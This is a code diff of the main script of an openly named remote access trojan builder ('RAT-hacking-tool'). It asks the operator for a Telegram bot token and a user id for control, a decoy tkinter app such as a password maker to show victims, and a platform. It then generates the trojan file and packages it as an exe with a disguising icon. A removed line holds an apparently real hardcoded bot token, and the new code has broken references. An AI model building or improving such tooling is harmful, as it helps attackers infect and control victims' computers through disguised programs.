@@ -1,14 +1,19 @@
+# Import libraries
 from colorama import init, Fore, Style
-import requests
+from random import randint
 from modules import make
 from json import loads
+import requests
 import os
 
+# setup the  colorama library
 init()
-def clear():
+
+# create functions
+def clear(): # clear the terminal after check the OS
     os.system('cls' if os.name == 'nt' else 'clear')
-def banner():
-    from random import randint
+def banner(): # print a random banner each time
+    # define the banners
     banners = [r"""
 
           _____                            _____                        _____                            _____  
@@ -73,10 +78,13 @@ $$$$$$$$"$$$       '''    $         $$          $$'
 MMM  M'  "MMM      "YMmMY"          MMM        ;;;;;YUMMM
 
 """]
+    # clear terminal
     clear()
+    # print banner
     print(Fore.CYAN + banners[randint(0, 3)] + Style.RESET_ALL)
-def same_banner():
-    ban ="""
+def same_banner(): # print a same banner each time
+    # define banner
+    banner ="""
  _______    _______   _________   _       
 (       )  (  ____ \  \__   __/  ( \      
 | () () |  | (    \/     ) (     | (      
@@ -86,63 +94,52 @@ def same_banner():
 | )   ( |  /\____) |     | |     | (____/\ 
 |/     \|  \_______)     )_(     (_______/                                       
 """
-    print(Fore.CYAN + ban)
-def check_update(): 
+    # print banner
+    print(Fore.CYAN + banner)
+def check_update(): # send a request to github repo to check updates
     try:
-        online_version = loads(requests.get("https://raw.githubusercontent.com/Unknow-per/MS-TL-hacking-tool/main/log/version.json").text)
+        # send a request to log/version.json file in github repo and read it and save it in 'online_version'
+        online_version = loads(requests.get("https://raw.githubusercontent.com/Farbod-Parkhooi/RAT-hacking-tool/main/log/version.json").text)
+        # read the log/version.json file
         with open("log/version.json", "r") as file:
+            # save the text of file in 'local_version'
             local_version = loads(file.read())
-        if online_version["version"] == local_version["version"]: pass
+        # check the different between 'online_version' and 'offline_version' (if they are different it exit from program)
+        if online_version["version"] == local_version["version"]: pass 
         else: 
             print(Fore.RED + "Please update the program with 'git pull' command.")
             exit()
     except: 
         print(Fore.RED + "Please check your internet connection. Then, try again.")
         exit()
-def get_options():
+def get_options(): # get all of inputs and make python file
     try: 
+        # get inputs
         id = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram user id(with @userinfobot): "))
-        tok = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome token write C if not press enter: ")).lower()
-        if tok == "c":
-            token = input("Write your bot token: ")
-        else: 
-            token = "6622962602:AAERgZlXugMGZIA5vqkIpv5KKAAsDUrA6is"
-        name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome name write C if not press enter: ")).lower()
-        if name == "c": 
-            name = input("Write your app name(ex: mstl): ")
-        else: 
-            name = "mstl"
-        icon = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use custome icon write C if not press enter: ")).lower()    
-        if icon == "c":
-            icon = input("write your icon file address(.ico file): ")
-            if icon.endswith(".ico"): pass
-        else: 
-            icon = "icongallery/icon.ico"
-        code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome tkinter code write C if not press enter: ")).lower()    
-        if code_addr == "c":
-            code_addr = input("write your code address(.py file): ")
-            if code_addr.endswith(".py"): pass
-        else: 
-            code_addr = "builder/tk_payloads/password_maker.py"
-        offline_code_addr = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custome offline tkinter code write C if not press enter: ")).lower()    
-        if offline_code_addr == "c":
-            offline_code_addr = input("write your code address(.py file): ")
-            if code_addr.endswith(".py"): pass
-        else: 
-            offline_code_addr = "builder/tk_payloads/offline/no_internet.py"
-        platform = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " Choice your platform(windows, linux, mac): ")).lower()
-        if platform == "linux": 
+        token = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your telegram bot token here: ")).lower()
+        name = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your application name: ")).lower()        
+        
+        code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " write your code file address for when victim is online(befor that check the imported libraries in bulder/windows-build or bulder/linux-build): ")).lower()    
+        offline_code_addr_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " If you want to use your custom offline tkinter code write C if not press enter: ")).lower()    
+        platform_inp = str(input(Fore.GREEN + "[+]" + Fore.WHITE + " Choice your platform(windows, linux, mac): ")).lower()
+        # validate the inputs
+        if platform_inp.startswith("win"):
+            platform = "builder/windows-build.py"
+        elif platform_inp.startswith("linux"): 
             platform = "builder/linux-build.py"
-        elif platform == "mac": 
-            print(Fore.RED + "Mac payload doesn't exist. Sorry.")
+        elif platform_inp.startswith("mac"): 
+            print(Fore.RED + "Mac builder doesn't exist. Sorry.")
             exit()
         else: 
-            platform = "builder/windows-build.py"
+            print(Fore.RED + "This platform dosnt exist!")
+            exit()
+        offline_code_addr = offline_code_addr_inp if offline_code_addr_inp.endswith(".py") else "builder/tk_payloads/offline/no_internet.py"
+        icon = icon_inp if icon.endswith(".ico") else "icongallery/icon.ico"
+        code_addr = code_addr_inp if code_addr_inp.endswith(".py") else "builder/tk_payloads/password_maker.py"
+        # make python file
         make.make_python(ID=id, TOKEN=token, NAME=name, CODE_ADDR=code_addr, OFFLINE_CODE_ADDR=offline_code_addr, PLATFORM=platform)
-        opt = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
-        if opt == "y": 
-            make.make_exe(NAME=name, ICON=icon)
-        else: 
-            exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
+        exe = input(Fore.YELLOW + "Make it exe(Y for yes and N for no)? " + Fore.RESET).lower()
+        # make the exe and exit from program
+        make.make_exe(NAME=name, ICON=icon) if exe == "y" else exit(Fore.CYAN + "\n\n Good Luck \n\n" + Fore.RESET)
     except ValueError: print(Fore.RED + "Invalid input."), exit()
     except KeyboardInterrupt: exit(f"\n\n\{Fore.CYAN}nGood Luck{banner.Style.RESET_ALL}\n\n")
